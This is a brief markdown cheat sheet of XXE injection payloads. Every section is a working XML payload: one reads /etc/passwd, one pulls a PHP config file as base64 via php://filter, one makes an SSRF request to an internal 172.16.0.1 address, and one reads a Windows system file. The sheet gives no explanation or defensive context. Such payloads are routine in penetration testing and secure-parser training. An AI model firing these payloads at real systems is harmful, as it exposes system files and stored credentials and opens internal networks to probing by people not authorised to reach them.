# XXE (XML External Entity Injection)

## File Read

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

## PHP Source Code (base64)

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/config.php">
]>
<root>&xxe;</root>
```

## SSRF

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://172.16.0.1:8080/">
]>
<root>&xxe;</root>
```

## Windows File Read

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<root>&xxe;</root>
```
